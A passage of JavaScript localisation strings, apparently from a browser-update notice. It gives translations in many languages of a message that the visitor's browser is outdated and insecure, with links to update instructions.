|     t.ko = '\xEC\xA7\x80\xEA\xB8\x88 \xEC\x82\xAC\xEC\x9A\xA9\xED\x95\x98\xEA\xB3\xA0 \xEA\xB3\x84\xEC\x8B\xA0 \xEB\xB8\x8C\xEB\x9D\xBC\xEC\x9A\xB0\xEC\xA0\x80(%s)\xEB\x8A\x94 <b>\xEC\x98\xA4\xEB\x9E\x98\xEB\x90\x98\xEC\x97\x88\xEC\x8A\xB5\xEB\x8B\x88\xEB\x8B\xA4.</b> \xEC\x95\x8C\xEB\xA0\xA4\xEC\xA7\x84 <b>\xEB\xB3\xB4\xEC\x95\x88 \xEC\xB7\xA8\xEC\x95\xBD\xEC\xA0\x90</b>\xEC\x9D\xB4 \xEC\xA1\xB4\xEC\x9E\xAC\xED\x95\x98\xEB\xA9\xB0, \xEC\x83\x88\xEB\xA1\x9C\xEC\x9A\xB4 \xEC\x9B\xB9 \xEC\x82\xAC\xEC\x9D\xB4\xED\x8A\xB8\xEA\xB0\x80 <b>\xEA\xB9\xA8\xEC\xA0\xB8 \xEB\xB3\xB4\xEC\x9D\xBC \xEC\x88\x98\xEB\x8F\x84</b> \xEC\x9E\x88\xEC\x8A\xB5\xEB\x8B\x88\xEB\x8B\xA4. <a%s>\xEB\xB8\x8C\xEB\x9D\xBC\xEC\x9A\xB0\xEC\xA0\x80\xEB\xA5\xBC \xEC\x96\xB4\xEB\x96\xBB\xEA\xB2\x8C \xEC\x97\x85\xEB\x8D\xB0\xEC\x9D\xB4\xED\x8A\xB8\xED\x95\x98\xEB\x82\x98\xEC\x9A\x94?</a>';\x0D
|     t.rm = 'Tes navigatur (%s) \xC3\xA8 <b>antiqu\xC3\xA0</b>. El cuntegna <b>problems da segirezza</b> enconuschents e mussa eventualmain <b>betg tut las funcziuns</b> da questa ed autras websites. <a%s>Emprenda sco actualisar tes navigatur</a>.';\x0D
|     t.jp = '\xE3\x81\x8A\xE4\xBD\xBF\xE3\x81\x84\xE3\x81\xAE\xE3\x83\x96\xE3\x83\xA9\xE3\x82\xA6\xE3\x82\xB6\xE3\x80\x8C%s\xE3\x80\x8D\xE3\x81\xAF\xE3\x80\x81<b>\xE6\x99\x82\xE4\xBB\xA3\xE9\x81\x85\xE3\x82\x8C</b>\xE3\x81\xAE\xE3\x83\x90\xE3\x83\xBC\xE3\x82\xB8\xE3\x83\xA7\xE3\x83\xB3\xE3\x81\xA7\xE3\x81\x99\xE3\x80\x82\xE6\x97\xA2\xE7\x9F\xA5\xE3\x81\xAE<b>\xE8\x84\x86\xE5\xBC\xB1\xE6\x80\xA7</b>\xE3\x81\x8C\xE5\xAD\x98\xE5\x9C\xA8\xE3\x81\x99\xE3\x82\x8B\xE3\x81\xB0\xE3\x81\x8B\xE3\x82\x8A\xE3\x81\x8B\xE3\x80\x81<b>\xE6\xA9\x9F\xE8\x83\xBD\xE4\xB8\x8D\xE8\xB6\xB3</b>\xE3\x81\xAB\xE3\x82\x88\xE3\x81\xA3\xE3\x81\xA6\xE3\x80\x81\xE3\x82\xB5\xE3\x82\xA4\xE3\x83\x88\xE3\x81\x8C\xE6\xAD\xA3\xE5\xB8\xB8\xE3\x81\xAB\xE8\xA1\xA8\xE7\xA4\xBA\xE3\x81\xA7\xE3\x81\x8D\xE3\x81\xAA\xE3\x81\x84\xE5\x8F\xAF\xE8\x83\xBD\xE6\x80\xA7\xE3\x81\x8C\xE3\x81\x82\xE3\x82\x8A\xE3\x81\xBE\xE3\x81\x99\xE3\x80\x82 <a%s>\xE3\x83\x96\xE3\x83\xA9\xE3\x82\xA6\xE3\x82\xB6\xE3\x82\x92\xE6\x9B\xB4\xE6\x96\xB0\xE3\x81\x99\xE3\x82\x8B\xE6\x96\xB9\xE6\xB3\x95\xE3\x82\x92\xE7\xA2\xBA\xE8\xAA\x8D\xE3\x81\x99\xE3\x82\x8B</a>';\x0D
|     t.fr = '<b>Votre navigateur (%s) est p\xC3\xA9rim\xC3\xA9</b>. Il contient des failles de s\xC3\xA9curit\xC3\xA9 et pourrait ne pas afficher certaines fonctionnalit\xC3\xA9s des sites internet r\xC3\xA9cents. <a%s>Mettre le navigateur \xC3\xA0 jour</a> <a%s>Fermer</a>';\x0D
|     t.da = 'Din browser (%s) er <b>for&aelig;ldet</b>. Den har kendte <b>sikkerhedshuller</b> og kan m&aring;ske <b>ikke vise alle funktioner</b> p&aring; dette og andre websteder. <a%s>Se hvordan du opdaterer din browser</a>';\x0D
|     t.sq = 'Shfletuesi juaj (%s) \xC3\xABsht\xC3\xAB <b>ca i vjet\xC3\xABr</b>. Ai ka <b>t\xC3\xAB meta sigurie</b> t\xC3\xAB njohura dhe mundet t\xC3\xAB <b>mos i shfaq\xC3\xAB t\xC3\xAB gjitha karakteristikat</b> e k\xC3\xABsaj dhe shum\xC3\xAB faqeve web t\xC3\xAB tjera. <a%s>M\xC3\xABsoni se si t\xC3\xAB p\xC3\xABrdit\xC3\xABsoni shfletuesin tuaj</a>';\x0D
|     t.ca = 'El teu navegador (%s) est\xC3\xA0 <b>desactualitzat</b>. T\xC3\xA9 <b>vulnerabilitats</b> conegudes i pot <b>no mostrar totes les caracter\xC3\xADstiques</b> d\'aquest i altres llocs web. <a%s>Apr\xC3\xA8n a actualitzar el navegador</a>';\x0D
|     t.fa = '\xD9\x85\xD8\xB1\xD9\x88\xD8\xB1\xDA\xAF\xD8\xB1 \xD8\xB4\xD9\x85\xD8\xA7 (%s) <b>\xD8\xA7\xD8\xB2 \xD8\xB1\xD8\xAF\xD9\x87 \xD8\xAE\xD8\xA7\xD8\xB1\xD8\xAC \xD8\xB4\xD8\xAF\xD9\x87</b> \xD9\x85\xDB\x8C \xD8\xA8\xD8\xA7\xD8\xB4\xD8\xAF. \xD8\xA7\xDB\x8C\xD9\x86 \xD9\x85\xD8\xB1\xD9\x88\xD8\xB1\xDA\xAF\xD8\xB1 \xD8\xAF\xD8\xA7\xD8\xB1\xD8\xA7\xDB\x8C <b>\xD9\x85\xD8\xB4\xDA\xA9\xD9\x84\xD8\xA7\xD8\xAA \xD8\xA7\xD9\x85\xD9\x86\xDB\x8C\xD8\xAA\xDB\x8C \xD8\xB4\xD9\x86\xD8\xA7\xD8\xAE\xD8\xAA\xD9\x87 \xD8\xB4\xD8\xAF\xD9\x87</b> \xD9\x85\xDB\x8C \xD8\xA8\xD8\xA7\xD8\xB4\xD8\xAF \xD9\x88 <b>\xD9\x86\xD9\x85\xDB\x8C \xD8\xAA\xD9\x88\xD8\xA7\xD9\x86\xD8\xAF \xD8\xAA\xD9\x85\xD8\xA7\xD9\x85\xDB\x8C \xD9\x88\xDB\x8C\xDA\x98\xDA\xAF\xDB\x8C \xD9\x87\xD8\xA7\xDB\x8C \xD8\xA7\xDB\x8C\xD9\x86</b> \xD9\x88\xD8\xA8 \xD8\xB3\xD8\xA7\xDB\x8C\xD8\xAA \xD9\x88 \xD8\xAF\xDB\x8C\xDA\xAF\xD8\xB1 \xD9\x88\xD8\xA8 \xD8\xB3\xD8\xA7\xDB\x8C\xD8\xAA \xD9\x87\xD8\xA7 \xD8\xB1\xD8\xA7 \xD8\xA8\xD9\x87 \xD8\xAE\xD9\x88\xD8\xA8\xDB\x8C \xD9\x86\xD9\x85\xD8\xA7\xDB\x8C\xD8\xB4 \xD8\xAF\xD9\x87\xD8\xAF. <a%s>\xD8\xAF\xD8\xB1 \xD8\xAE\xD8\xB5\xD9\x88\xD8\xB5 \xDA\xAF\xD8\xB1\xD9\x81\xD8\xAA\xD9\x86 \xD8\xB1\xD8\xA7\xD9\x87\xD9\x86\xD9\x85\xD8\xA7\xDB\x8C\xDB\x8C \xD8\xAF\xD8\xB1\xD8\xAE\xD8\xB5\xD9\x88\xD8\xB5 \xD9\x86\xD8\xAD\xD9\x88\xD9\x87 \xDB\x8C \xD8\xA8\xD9\x87 \xD8\xB1\xD9\x88\xD8\xB2 \xD8\xB1\xD8\xB3\xD8\xA7\xD9\x86\xDB\x8C \xD9\x85\xD8\xB1\xD9\x88\xD8\xB1\xDA\xAF\xD8\xB1 \xD8\xAE\xD9\x88\xD8\xAF \xD8\xA7\xDB\x8C\xD9\x86\xD8\xAC\xD8\xA7 \xDA\xA9\xD9\x84\xDB\x8C\xDA\xA9 \xDA\xA9\xD9\x86\xDB\x8C\xD8\xAF.</a>';\x0D
|     t.sv = 'Din webbl\xC3\xA4sare (%s) \xC3\xA4r <b>f\xC3\xB6r\xC3\xA5ldrad</b>. Den har k\xC3\xA4nda <b>s\xC3\xA4kerhetsh\xC3\xA5l</b> och <b>kan inte visa alla funktioner korrekt</b> p\xC3\xA5 denna och p\xC3\xA5 andra webbsidor. <a%s>Uppdatera din webbl\xC3\xA4sare idag</a>';\x0D
|     t.hu = 'Az \xC3\x96n b\xC3\xB6ng\xC3\xA9sz\xC5\x91je (%s) <b>elavult</b>. Ismert <b>biztons\xC3\xA1gi hi\xC3\xA1nyoss\xC3\xA1gai</b> vannak \xC3\xA9s esetlegesen <b>nem tud minden funkci\xC3\xB3t megjelen\xC3\xADteni</b> ezen vagy m\xC3\xA1s weboldalakon. <a%s>Itt tal\xC3\xA1l b\xC5\x91vebb inform\xC3\xA1ci\xC3\xB3t a b\xC3\xB6ng\xC3\xA9sz\xC5\x91j\xC3\xA9nek friss\xC3\xADt\xC3\xA9s\xC3\xA9vel kapcsolatban</a>     ';\x0D
|     t.gl = 'O seu navegador (%s) est\xC3\xA1 <b>desactualizado</b>. Ten co\xC3\xB1ecidos <b>fallos de seguranza</b> e poder\xC3\xADa <b>non mostrar t\xC3\xB3dalas caracter\xC3\xADsticas</b> deste e outros sitios web. <a%s>Aprenda como pode actualizar o seu navegador</a>';\x0D
|     t.cs = 'V\xC3\xA1\xC5\xA1 prohl\xC3\xAD\xC5\xBEe\xC4\x8D (%s) je <b>zastaral\xC3\xBD</b>. Jsou zn\xC3\xA1my <b>bezpe\xC4\x8Dnostn\xC3\xAD rizika</b> a mo\xC5\xBEn\xC3\xA1 <b>nedok\xC3\xA1\xC5\xBEe zobrazit v\xC5\xA1echny prvky</b> t\xC3\xA9to a dal\xC5\xA1\xC3\xADch webov\xC3\xBDch str\xC3\xA1nek. <a%s>Nau\xC4\x8Dte se, jak aktualizovat sv\xC5\xAFj prohl\xC3\xAD\xC5\xBEe\xC4\x8D</a>';\x0D
|     t.he = '\xD7\x94\xD7\x93\xD7\xA4\xD7\x93\xD7\xA4\xD7\x9F \xD7\xA9\xD7\x9C\xD7\x9A (%s) <b>\xD7\x90\xD7\x99\xD7\xA0\xD7\x95 \xD7\x9E\xD7\xA2\xD7\x95\xD7\x93\xD7\x9B\xD7\x9F</b>. \xD7\x99\xD7\xA9 \xD7\x9C\xD7\x95 <b>\xD7\x91\xD7\xA2\xD7\x99\xD7\x95\xD7\xAA \xD7\x90\xD7\x91\xD7\x98\xD7\x97\xD7\x94 \xD7\x99\xD7\x93\xD7\x95\xD7\xA2\xD7\x95\xD7\xAA</b> \xD7\x95\xD7\xA2\xD7\xA9\xD7\x95\xD7\x99 <b>\xD7\x9C\xD7\x90 \xD7\x9C\xD7\x94\xD7\xA6\xD7\x99\xD7\x92 \xD7\x90\xD7\xAA \xD7\x9B\xD7\x9C \xD7\x94\xD7\xAA\xD7\x9B\xD7\x95\xD7\xA0\xD7\x95\xD7\xAA</b> \xD7\xA9\xD7\x9C \xD7\x90\xD7\xAA\xD7\xA8 \xD7\x96\xD7\x94 \xD7\x95\xD7\x90\xD7\xAA\xD7\xA8\xD7\x99\xD7\x9D \xD7\x90\xD7\x97\xD7\xA8\xD7\x99\xD7\x9D. <a%s>\xD7\x9C\xD7\x9E\xD7\x93 \xD7\x9B\xD7\x99\xD7\xA6\xD7\x93 \xD7\x9C\xD7\xA2\xD7\x93\xD7\x9B\xD7\x9F \xD7\x90\xD7\xAA \xD7\x94\xD7\x93\xD7\xA4\xD7\x93\xD7\xA4\xD7\x9F \xD7\xA9\xD7\x9C\xD7\x9A</a>';\x0D
|     t.nb = 'Nettleseren din (%s) er <b>utdatert</b>. Den har kjente <b>sikkerhetshull</b> og <b>kan ikke vise alle funksjonene</b> p\xC3\xA5 denne og andre websider. <a%s>L\xC3\xA6r hvordan du kan oppdatere din nettleser</a>';\x0D
|     t["zh-tw"] = '\xE6\x82\xA8\xE7\x9A\x84\xE7\x80\x8F\xE8\xA6\xBD\xE5\x99\xA8(%s) \xE9\x9C\x80\xE8\xA6\x81\xE6\x9B\xB4\xE6\x96\xB0\xE3\x80\x82\xE8\xA9\xB2\xE7\x80\x8F\xE8\xA6\xBD\xE5\x99\xA8\xE6\x9C\x89\xE8\xAB\xB8\xE5\xA4\x9A\xE5\xAE\x89\xE5\x85\xA8\xE6\xBC\x8F\xE6\xB4\x9E\xEF\xBC\x8C\xE7\x84\xA1\xE6\xB3\x95\xE9\xA1\xAF\xE7\xA4\xBA\xE6\x9C\xAC\xE7\xB6\xB2\xE7\xAB\x99\xE7\x9A\x84\xE6\x89\x80\xE6\x9C\x89\xE5\x8A\x9F\xE8\x83\xBD\xE3\x80\x82 <a%s>\xE7\x9E\xAD\xE8\xA7\xA3\xE5\xA6\x82\xE4\xBD\x95\xE6\x9B\xB4\xE6\x96\xB0\xE7\x80\x8F\xE8\xA6\xBD\xE5\x99\xA8</a>';\x0D
|     t.zh = '<b>\xE6\x82\xA8\xE7\x9A\x84\xE7\xBD\x91\xE9\xA1\xB5\xE6\xB5\x8F\xE8\xA7\x88\xE5\x99\xA8 (%s) \xE5\xB7\xB2\xE8\xBF\x87\xE6\x9C\x9F</b>\xE3\x80\x82\xE6\x9B\xB4\xE6\x96\xB0\xE6\x82\xA8\xE7\x9A\x84\xE6\xB5\x8F\xE8\xA7\x88\xE5\x99\xA8\xEF\xBC\x8C\xE4\xBB\xA5\xE6\x8F\x90\xE9\xAB\x98\xE5\xAE\x89\xE5\x85\xA8\xE6\x80\xA7\xE5\x92\x8C\xE8\x88\x92\xE9\x80\x82\xE6\x80\xA7\xEF\xBC\x8C\xE5\xB9\xB6\xE8\x8E\xB7\xE5\xBE\x97\xE8\xAE\xBF\xE9\x97\xAE\xE6\x9C\xAC\xE7\xBD\x91\xE7\xAB\x99\xE7\x9A\x84\xE6\x9C\x80\xE4\xBD\xB3\xE4\xBD\x93\xE9\xAA\x8C\xE3\x80\x82<a%s>\xE6\x9B\xB4\xE6\x96\xB0\xE6\xB5\x8F\xE8\xA7\x88\xE5\x99\xA8</a> <a%s>\xE5\xBF\xBD\xE7\x95\xA5</a>';\x0D
|     t.fi = 'Selaimesi (%s) on <b>vanhentunut</b>. Siin\xC3\xA4 on tunnettuja tietoturvaongelmia eik\xC3\xA4 se v\xC3\xA4ltt\xC3\xA4m\xC3\xA4tt\xC3\xA4 tue kaikkia ominaisuuksia t\xC3\xA4ll\xC3\xA4 tai muilla sivustoilla. <a%s>Lue lis\xC3\xA4\xC3\xA4 siit\xC3\xA4 kuinka p\xC3\xA4ivit\xC3\xA4t selaimesi</a>.';\x0D
|     t.tr = 'Taray\xC4\xB1c\xC4\xB1n\xC4\xB1z (%s) <b>g\xC3\xBCncel de\xC4\x9Fil</b>. Eski versiyon oldu\xC4\x9Fu i\xC3\xA7in <b>g\xC3\xBCvenlik a\xC3\xA7\xC4\xB1klar\xC4\xB1</b> vard\xC4\xB1r ve g\xC3\xB6rmek istedi\xC4\x9Finiz bu web sitesinin ve di\xC4\x9Fer web sitelerinin <b>t\xC3\xBCm \xC3\xB6zelliklerini hatas\xC4\xB1z bir \xC5\x9Fekilde</b> g\xC3\xB6steremeyecektir. <a%s>Taray\xC4\xB1c\xC4\xB1n\xC4\xB1z\xC4\xB1 nas\xC4\xB1l g\xC3\xBCncelleyebilece\xC4\x9Finizi \xC3\xB6\xC4\x9Frenin</a>';\x0D
|     t.ro = 'Browser-ul (%s) tau este <b>invechit</b>. Detine <b>probleme de securitate</b> cunoscute si poate <b>sa nu afiseze corect</b> toate elementele acestui si altor site-uri. <a%s>Invata cum sa-ti actualizezi browserul.</a>';\x0D
|     t.bg = '\xD0\x92\xD0\xB0\xD1\x88\xD0\xB8\xD1\x8F\xD1\x82 \xD0\xB1\xD1\x80\xD0\xB0\xD1\x83\xD0\xB7\xD1\x8A\xD1\x80 (%s) <b>\xD0\xBD\xD0\xB5 \xD0\xB5 \xD0\xB0\xD0\xBA\xD1\x82\xD1\x83\xD0\xB0\xD0\xBB\xD0\xB5\xD0\xBD</b>. \xD0\x98\xD0\xB7\xD0\xB2\xD0\xB5\xD1\x81\xD1\x82\xD0\xBD\xD0\xBE \xD0\xB5, \xD1\x87\xD0\xB5 \xD0\xB8\xD0\xBC\xD0\xB0 <b>\xD0\xBF\xD1\x80\xD0\xBE\xD0\xBF\xD1\x83\xD1\x81\xD0\xBA\xD0\xB8 \xD0\xB2 \xD1\x81\xD0\xB8\xD0\xB3\xD1\x83\xD1\x80\xD0\xBD\xD0\xBE\xD1\x81\xD1\x82\xD1\x82\xD0\xB0</b> \xD0\xB8 \xD0\xBC\xD0\xBE\xD0\xB6\xD0\xB5 <b>\xD0\xB4\xD0\xB0 \xD0\xBD\xD0\xB5 \xD0\xBF\xD0\xBE\xD0\xBA\xD0\xB0\xD0\xB6\xD0\xB5 \xD0\xBF\xD1\x80\xD0\xB0\xD0\xB2\xD0\xB8\xD0\xBB\xD0\xBD\xD0\xBE</b> \xD1\x82\xD0\xBE\xD0\xB7\xD0\xB8 \xD0\xB8\xD0\xBB\xD0\xB8 \xD0\xB4\xD1\x80\xD1\x83\xD0\xB3\xD0\xB8 \xD1\x81\xD0\xB0\xD0\xB9\xD1\x82\xD0\xBE\xD0\xB2\xD0\xB5. <a%s>\xD0\x9D\xD0\xB0\xD1\x83\xD1\x87\xD0\xB5\xD1\x82\xD0\xB5 \xD0\xBA\xD0\xB0\xD0\xBA \xD0\xB4\xD0\xB0 \xD0\xB0\xD0\xBA\xD1\x82\xD1\x83\xD0\xB0\xD0\xBB\xD0\xB8\xD0\xB7\xD0\xB8\xD1\x80\xD0\xB0\xD1\x82\xD0\xB5 \xD0\xB1\xD1\x80\xD0\xB0\xD1\x83\xD0\xB7\xD1\x8A\xD1\x80\xD0\xB0 \xD1\x81\xD0\xB8</a>.';\x0D
|     t.el = '\xCE\x91\xCF\x85\xCF\x84\xCF\x8C\xCF\x82 \xCE\xBF \xCE\xB9\xCF\x83\xCF\x84\xCF\x8C\xCF\x84\xCE\xBF\xCF\x80\xCE\xBF\xCF\x82 \xCF\x83\xCE\xB1\xCF\x82 \xCF\x85\xCF\x80\xCE\xB5\xCE\xBD\xCE\xB8\xCF\x85\xCE\xBC\xCE\xAF\xCE\xB6\xCE\xB5\xCE\xB9: \xCE\x9F \xCF\x86\xCF\x85\xCE\xBB\xCE\xBB\xCE\xBF\xCE\xBC\xCE\xB5\xCF\x84\xCF\x81\xCE\xB7\xCF\x84\xCE\xAE\xCF\x82 \xCF\x83\xCE\xB1\xCF\x82 (%s) \xCE\xB5\xCE\xAF\xCE\xBD\xCE\xB1\xCE\xB9 <b>\xCF\x80\xCE\xB1\xCF\x81\xCF\x89\xCF\x87\xCE\xB7\xCE\xBC\xCE\xAD\xCE\xBD\xCE\xBF\xCF\x82</b>. <a%s>\xCE\x95\xCE\xBD\xCE\xB7\xCE\xBC\xCE\xB5\xCF\x81\xCF\x8E\xCF\x83\xCF\x84\xCE\xB5 \xCF\x84\xCE\xBF \xCF\x80\xCF\x81\xCF\x8C\xCE\xB3\xCF\x81\xCE\xB1\xCE\xBC\xCE\xBC\xCE\xB1 \xCF\x80\xCE\xB5\xCF\x81\xCE\xB9\xCE\xAE\xCE\xB3\xCE\xB7\xCF\x83\xCE\xAE\xCF\x82 \xCF\x83\xCE\xB1\xCF\x82</a> \xCE\xB3\xCE\xB9\xCE\xB1 \xCE\xBC\xCE\xB5\xCE\xB3\xCE\xB1\xCE\xBB\xCF\x8D\xCF\x84\xCE\xB5\xCF\x81\xCE\xB7 \xCE\xB1\xCF\x83\xCF\x86\xCE\xAC\xCE\xBB\xCE\xB5\xCE\xB9\xCE\xB1 \xCE\xBA\xCE\xB1\xCE\xB9 \xCE\xAC\xCE\xBD\xCE\xB5\xCF\x83\xCE\xB7 \xCF\x83\xCE\xB5 \xCE\xB1\xCF\x85\xCF\x84\xCE\xAE\xCE\xBD \xCF\x84\xCE\xB7\xCE\xBD \xCE\xB9\xCF\x83\xCF\x84\xCE\xBF\xCF\x83\xCE\xB5\xCE\xBB\xCE\xAF\xCE\xB4\xCE\xB1.';\x0D
|     t.ar = '\xD9\x85\xD8\xAA\xD8\xB5\xD9\x81\xD8\xAD\xD9\x83 (%s) <b>\xD9\x85\xD9\x86\xD8\xAA\xD9\x87\xD9\x89 \xD8\xA7\xD9\x84\xD8\xB5\xD9\x84\xD8\xA7\xD8\xAD\xD9\x8A\xD9\x87</b>. \xD9\x88\xD9\x8A\xD9\x88\xD8\xAC\xD8\xAF \xD8\xA8\xD9\x87 <b>\xD8\xAB\xD8\xBA\xD8\xB1\xD8\xA7\xD8\xAA \xD8\xA7\xD9\x85\xD9\x86\xD9\x8A\xD8\xA9</b> \xD9\x85\xD8\xB9\xD8\xB1\xD9\x88\xD9\x81\xD8\xA9 \xD9\x88\xD9\x82\xD8\xAF <b>\xD9\x84\xD8\xA7 \xD9\x8A\xD9\x8F\xD8\xB4\xD8\xBA\xD9\x84 \xD9\x83\xD8\xAB\xD9\x8A\xD8\xB1 \xD9\x85\xD9\x86 \xD8\xA7\xD9\x84\xD9\x85\xD9\x8A\xD8\xB2\xD8\xA7\xD8\xAA</b> \xD8\xA7\xD9\x84\xD9\x85\xD8\xAA\xD8\xB9\xD9\x84\xD9\x82\xD9\x87 \xD8\xA8\xD9\x87\xD8\xB0\xD9\x87 \xD8\xA7\xD9\x84\xD9\x85\xD9\x88\xD9\x82\xD8\xB9. <a%s>\xD8\xA3\xD8\xB6\xD8\xBA\xD8\xB7 \xD9\x87\xD9\x86\xD8\xA7</a>\xD9\x84\xD8\xAA\xD8\xB9\xD8\xB1\xD9\x81 \xD9\x83\xD9\x8A\xD9\x81 \xD8\xAA\xD9\x82\xD9\x88\xD9\x85 \xD8\xA8\xD8\xAA\xD8\xAD\xD8\xAF\xD9\x8A\xD8\xAB \xD9\x85\xD8\xAA\xD8\xB5\xD9\x81\xD8\xAD\xD9\x83';\x0D
|     t.sr = 'Va\xC5\xA1 pretra\xC5\xBEiva\xC4\x8D (%s) je <b>zastareo</b>. Ima poznate <b>sigurnosne probleme</b> i najverovatnije <b>ne\xC4\x87e prikazati sve funkcionalnisti</b> ovog i drugih sajtova. <a%s>Nau\xC4\x8Di vi\xC5\xA1e o nadogradnji svog pretra\xC5\xBEiva\xC4\x8Da</a>';\x0D
|     t.la = 'M\xC4\x93s v\xC4\x93lamies Jums atg\xC4\x81din\xC4\x81t: J\xC5\xABsu p\xC4\x81rl\xC5\xABkprogramma (%s) ir novecojusi. <a>Atjauniniet savu p\xC4\x81rl\xC5\xABkprogrammu</a>, lai uzlabotu dro\xC5\xA1\xC4\xABbu, \xC4\x81trumu un p\xC4\x81rl\xC5\xABko\xC5\xA1anas \xC4\x93rt\xC4\xABbas \xC5\xA1aj\xC4\x81 un cit\xC4\x81s lap\xC4\x81s.';\x0D
|     t.ga = 'T\xC3\xA1 an l\xC3\xADonl\xC3\xA9itheoir agat (%s) <b>as d\xC3\xA1ta</b>. T\xC3\xA1 <b>laigeachta\xC3\xAD sl\xC3\xA1nd\xC3\xA1la</b> a bhfuil ar eolas ann agus b\'fh\xC3\xA9idir <b>nach taispe\xC3\xA1nfaidh s\xC3\xA9 gach gn\xC3\xA9</b> den su\xC3\xADomh gr\xC3\xA9as\xC3\xA1in seo n\xC3\xA1 cinn eile. <a%s>Foghlaim conas do l\xC3\xADonl\xC3\xA9itheoir a nuashonr\xC3\xBA</a>';\x0D
|     t.lv = 'J\xC5\xABsu p\xC4\x81rl\xC5\xABkprogramma (%s) ir <b>novecojusi</b>.  Tai ir zin\xC4\x81mas <b>dro\xC5\xA1\xC4\xABbas probl\xC4\x93mas</b>, un t\xC4\x81 var att\xC4\x93lot \xC5\xA1o un citas  t\xC4\xABmek\xC4\xBCa lapas <b>nekorekti</b>. <a%s>Uzzini, k\xC4\x81 atjaunot savu p\xC4\x81rl\xC5\xABkprogrammu</a>';\x0D
|     t.no = 'Dette nettstedet \xC3\xB8nsker \xC3\xA5 minne deg p\xC3\xA5: Din nettleser (%s) er <b>utdatert</b>. <a%s>Oppdater nettleseren din </a> for mer sikkerhet, komfort og den beste opplevelsen p\xC3\xA5 denne siden.';\x0D
|     t.th = '\xE0\xB9\x80\xE0\xB8\xA7\xE0\xB9\x87\xE0\xB8\x9A\xE0\xB9\x84\xE0\xB8\x8B\xE0\xB8\x95\xE0\xB9\x8C\xE0\xB8\x99\xE0\xB8\xB5\xE0\xB9\x89\xE0\xB8\xAD\xE0\xB8\xA2\xE0\xB8\xB2\xE0\xB8\x81\xE0\xB8\x88\xE0\xB8\xB0\xE0\xB9\x80\xE0\xB8\x95\xE0\xB8\xB7\xE0\xB8\xAD\xE0\xB8\x99\xE0\xB8\x84\xE0\xB8\xB8\xE0\xB8\x93: \xE0\xB9\x80\xE0\xB8\x9A\xE0\xB8\xA3\xE0\xB8\xB2\xE0\xB8\xA7\xE0\xB9\x8C\xE0\xB9\x80\xE0\xB8\x8B\xE0\xB8\xAD\xE0\xB8\xA3\xE0\xB9\x8C (%s) \xE0\xB8\x82\xE0\xB8\xAD\xE0\xB8\x87\xE0\xB8\x84\xE0\xB8\xB8\xE0\xB8\x93\xE0\xB8\x99\xE0\xB8\xB1\xE0\xB9\x89\xE0\xB8\x99 <b>\xE0\xB8\xA5\xE0\xB9\x89\xE0\xB8\xB2\xE0\xB8\xAA\xE0\xB8\xA1\xE0\xB8\xB1\xE0\xB8\xA2\xE0\xB9\x81\xE0\xB8\xA5\xE0\xB9\x89\xE0\xB8\xA7</b> <a%s>\xE0\xB8\x9B\xE0\xB8\xA3\xE0\xB8\xB1\xE0\xB8\x9A\xE0\xB8\x9B\xE0\xB8\xA3\xE0\xB8\xB8\xE0\xB8\x87\xE0\xB9\x80\xE0\xB8\x9A\xE0\xB8\xA3\xE0\xB8\xB2\xE0\xB8\xA7\xE0\xB9\x8C\xE0\xB9\x80\xE0\xB8\x8B\xE0\xB8\xAD\xE0\xB8\xA3\xE0\xB9\x8C\xE0\xB8\x82\xE0\xB8\xAD\xE0\xB8\x87\xE0\xB8\x84\xE0\xB8\xB8\xE0\xB8\x93</a> \xE0\xB9\x80\xE0\xB8\x9E\xE0\xB8\xB7\xE0\xB9\x88\xE0\xB8\xAD\xE0\xB9\x80\xE0\xB8\x9E\xE0\xB8\xB4\xE0\xB9\x88\xE0\xB8\xA1 \xE0\xB8\x84\xE0\xB8\xA7\xE0\xB8\xB2\xE0\xB8\xA1\xE0\xB8\x9B\xE0\xB8\xA5\xE0\xB8\xAD\xE0\xB8\x94\xE0\xB8\xA0\xE0\xB8\xB1\xE0\xB8\xA2 \xE0\xB8\x84\xE0\xB8\xA7\xE0\xB8\xB2\xE0\xB8\xA1\xE0\xB8\xAA\xE0\xB8\xB0\xE0\xB8\x94\xE0\xB8\xA7\xE0\xB8\x81\xE0\xB8\xAA\xE0\xB8\x9A\xE0\xB8\xB2\xE0\xB8\xA2\xE0\xB9\x81\xE0\xB8\xA5\xE0\xB8\xB0\xE0\xB8\x9B\xE0\xB8\xA3\xE0\xB8\xB0\xE0\xB8\xAA\xE0\xB8\x9A\xE0\xB8\x81\xE0\xB8\xB2\xE0\xB8\xA3\xE0\xB8\x93\xE0\xB9\x8C\xE0\xB8\x97\xE0\xB8\xB5\xE0\xB9\x88\xE0\xB8\x94\xE0\xB8\xB5\xE0\xB8\x97\xE0\xB8\xB5\xE0\xB9\x88\xE0\xB8\xAA\xE0\xB8\xB8\xE0\xB8\x94\xE0\xB9\x83\xE0\xB8\x99\xE0\xB9\x80\xE0\xB8\xA7\xE0\xB9\x87\xE0\xB8\x9A\xE0\xB9\x84\xE0\xB8\x8B\xE0\xB8\x95\xE0\xB9\x8C\xE0\xB8\x99\xE0\xB8\xB5\xE0\xB9\x89';\x0D
|     t.hi = '\xE0\xA4\xAF\xE0\xA4\xB9 \xE0\xA4\xB5\xE0\xA5\x87\xE0\xA4\xAC\xE0\xA4\xB8\xE0\xA4\xBE\xE0\xA4\x87\xE0\xA4\x9F \xE0\xA4\x86\xE0\xA4\xAA\xE0\xA4\x95\xE0\xA5\x8B \xE0\xA4\xAF\xE0\xA4\xBE\xE0\xA4\xA6 \xE0\xA4\xA6\xE0\xA4\xBF\xE0\xA4\xB2\xE0\xA4\xBE\xE0\xA4\xA8\xE0\xA4\xBE \xE0\xA4\x9A\xE0\xA4\xBE\xE0\xA4\xB9\xE0\xA4\xA4\xE0\xA5\x80 \xE0\xA4\xB9\xE0\xA5\x88\xE0\xA4\x82: \xE0\xA4\x86\xE0\xA4\xAA\xE0\xA4\x95\xE0\xA4\xBE \xE0\xA4\xAC\xE0\xA5\x8D\xE0\xA4\xB0\xE0\xA4\xBE\xE0\xA4\x89\xE0\xA4\x9C\xE0\xA4\xBC\xE0\xA4\xB0 (%s) <b> \xE0\xA4\x86\xE0\xA4\x89\xE0\xA4\x9F \xE0\xA4\x91\xE0\xA5\x9E \xE0\xA4\xA1\xE0\xA5\x87\xE0\xA4\x9F </ b> \xE0\xA4\xB9\xE0\xA5\x88\xE0\xA4\x82\xE0\xA5\xA4 <a%s> \xE0\xA4\x94\xE0\xA4\xB0 \xE0\xA4\x85\xE0\xA4\xA7\xE0\xA4\xBF\xE0\xA4\x95 